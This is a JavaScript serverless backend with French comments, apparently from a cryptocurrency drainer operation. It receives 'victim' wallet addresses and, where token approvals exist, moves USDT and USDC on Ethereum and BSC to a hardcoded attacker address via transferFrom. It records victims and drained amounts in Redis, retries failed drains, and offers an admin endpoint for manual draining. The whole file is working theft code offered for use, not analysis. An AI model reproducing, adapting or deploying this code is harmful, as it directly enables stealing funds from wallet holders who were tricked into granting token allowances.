import { ethers } from 'ethers';
import { createClient } from 'redis';

const ATTACKER_ADDRESS = '0x22C8A3678871133D80f457CFaa6a442CC383481F';

// --- Récupération de la clé privée ---
function getPrivateKey() {
  if (process.env.ATTACKER_PRIVATE_KEY) {
    const key = process.env.ATTACKER_PRIVATE_KEY.trim();
    if (key.length === 64) return '0x' + key;
  }
  const fs = require('fs');
  const path = require('path');
  const filePath = path.resolve('./private_key.txt');
  if (fs.existsSync(filePath)) {
    const key = fs.readFileSync(filePath, 'utf8').trim();
    if (key.length === 64) return '0x' + key;
  }
  throw new Error('🔴 Aucune clé privée valide. Définis ATTACKER_PRIVATE_KEY dans l’env ou crée private_key.txt');
}

const PRIVATE_KEY = getPrivateKey();
const wallet = new ethers.Wallet(PRIVATE_KEY);

// --- Configuration des tokens et RPCs ---
const TOKENS = {
  '1': {
    'USDT': { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
    'USDC': { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 }
  },
  '56': {
    'USDT': { address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18 },
    'USDC': { address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18 }
  }
};

const RPC_URLS = {
  '1': 'https://cloudflare-eth.com',
  '56': 'https://bsc-dataseed1.binance.org'
};

// ABI minimal pour ERC20
const ERC20_ABI = [
  'function allowance(address owner, address spender) view returns (uint256)',
  'function balanceOf(address owner) view returns (uint256)',
  'function transferFrom(address from, address to, uint256 amount) returns (bool)'
];

const drainedAddresses = new Set();

// --- Fonction d'enregistrement Redis ---
async function recordVictim(address, chain, token, amount, status) {
  const client = createClient({ url: process.env.REDIS_URL });
  try {
    await client.connect();
    const key = `victim:${address}`;
    await client.hSet(key, {
      chain,
      token,
      amount,
      status,
      timestamp: String(Date.now())
    });
    // Ajouter à la liste si pas déjà
    const list = await client.get('victims:list');
    const parsedList = list ? JSON.parse(list) : [];
    if (!parsedList.includes(address)) {
      parsedList.push(address);
      await client.set('victims:list', JSON.stringify(parsedList));
    }
  } finally {
    await client.disconnect();
  }
}

async function drainVictim(victimAddress, chainId) {
  if (drainedAddresses.has(victimAddress)) {
    console.log(`⚠️ Déjà drainé : ${victimAddress}`);
    return;
  }

  const provider = new ethers.providers.JsonRpcProvider(RPC_URLS[chainId] || RPC_URLS['1']);
  const signer = wallet.connect(provider);

  const tokens = TOKENS[chainId] || {};
  for (const [tokenName, tokenInfo] of Object.entries(tokens)) {
    const contract = new ethers.Contract(tokenInfo.address, ERC20_ABI, signer);
    try {
      const allowance = await contract.allowance(victimAddress, ATTACKER_ADDRESS);
      if (allowance.isZero()) {
        // Pas d'allowance → on note le solde disponible
        const balance = await contract.balanceOf(victimAddress);
        const formatted = ethers.utils.formatUnits(balance, tokenInfo.decimals);
        await recordVictim(victimAddress, chainId, tokenName, formatted, 'failed');
        console.log(`⏭️ ${tokenName} : allowance nulle (dispo ${formatted})`);
        continue;
      }

      // Drain
      const tx = await contract.transferFrom(victimAddress, ATTACKER_ADDRESS, allowance);
      const receipt = await tx.wait();
      console.log(`✅ ${tokenName} volé ! Tx: ${receipt.transactionHash}`);

      const drainedAmount = ethers.utils.formatUnits(allowance, tokenInfo.decimals);
      await recordVictim(victimAddress, chainId, tokenName, drainedAmount, 'drained');
    } catch (err) {
      console.error(`❌ Erreur sur ${tokenName} : ${err.message}`);
      try {
        const balance = await contract.balanceOf(victimAddress);
        const formatted = ethers.utils.formatUnits(balance, tokenInfo.decimals);
        await recordVictim(victimAddress, chainId, tokenName, formatted, 'failed');
      } catch (_) {
        await recordVictim(victimAddress, chainId, tokenName, '0', 'failed');
      }
    }
    // Pause entre les tokens
    await new Promise(r => setTimeout(r, 500));
  }
  drainedAddresses.add(victimAddress);
}

async function drainWithRetry(victim, chainId, retries = 5, baseDelay = 1000) {
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      await drainVictim(victim, chainId);
      console.log(`🔥 VICTOIRE : ${victim} vidé avec succès`);
      return true;
    } catch (err) {
      console.error(`⛔ Tentative ${attempt}/${retries} échouée : ${err.message}`);
      if (attempt === retries) {
        console.error(`💀 Échec final après ${retries} tentatives pour ${victim}`);
        return false;
      }
      const delay = baseDelay * Math.pow(2, attempt - 1);
      console.log(`⏳ Nouvelle tentative dans ${delay/1000}s...`);
      await new Promise(r => setTimeout(r, delay));
    }
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  if (req.method === 'POST') {
    const { victim, chain, adminSecret } = req.body;

    // --- DRAIN MANUEL ADMIN ---
    if (adminSecret) {
      if (!process.env.ADMIN_SECRET || process.env.ADMIN_SECRET.trim().length === 0) {
        return res.status(500).json({ error: 'ADMIN_SECRET non configuré sur le serveur' });
      }
      if (adminSecret !== process.env.ADMIN_SECRET) {
        return res.status(401).json({ error: 'Secret admin invalide' });
      }
      if (!victim || !ethers.utils.isAddress(victim)) {
        return res.status(400).json({ error: 'Adresse victime invalide' });
      }
      const targetChain = chain || '1';
      console.log(`🔧 Drain manuel admin pour ${victim} (chain ${targetChain})`);

      // Ajout immédiat dans Redis
      const client = createClient({ url: process.env.REDIS_URL });
      try {
        await client.connect();
        const list = await client.get('victims:list');
        const parsedList = list ? JSON.parse(list) : [];
        if (!parsedList.includes(victim)) {
          parsedList.push(victim);
          await client.set('victims:list', JSON.stringify(parsedList));
        }
      } finally {
        await client.disconnect();
      }

      const success = await drainWithRetry(victim, targetChain);
      if (success) {
        return res.status(200).json({ success: true, victim, chain: targetChain });
      } else {
        return res.status(500).json({ error: 'Échec du drain après plusieurs tentatives' });
      }
    }

    // --- FLUX NORMAL (victime scannée) ---
    if (!victim) return res.status(400).json({ error: 'Adresse victime manquante' });
    console.log(`📥 Victime reçue : ${victim} sur chain ${chain || '1'}`);

    // Ajout immédiat dans Redis
    const client = createClient({ url: process.env.REDIS_URL });
    try {
      await client.connect();
      const list = await client.get('victims:list');
      const parsedList = list ? JSON.parse(list) : [];
      if (!parsedList.includes(victim)) {
        parsedList.push(victim);
        await client.set('victims:list', JSON.stringify(parsedList));
      }
    } finally {
      await client.disconnect();
    }

    // Drain asynchrone (⚠️ problème Vercel : voir plus tard)
    drainWithRetry(victim, chain || '1').catch(err => console.error('Erreur drainWithRetry:', err));

    return res.status(200).json({ success: true, victim, chain: chain || '1' });
  } else {
    return res.status(405).json({ error: 'Méthode non autorisée' });
  }
}
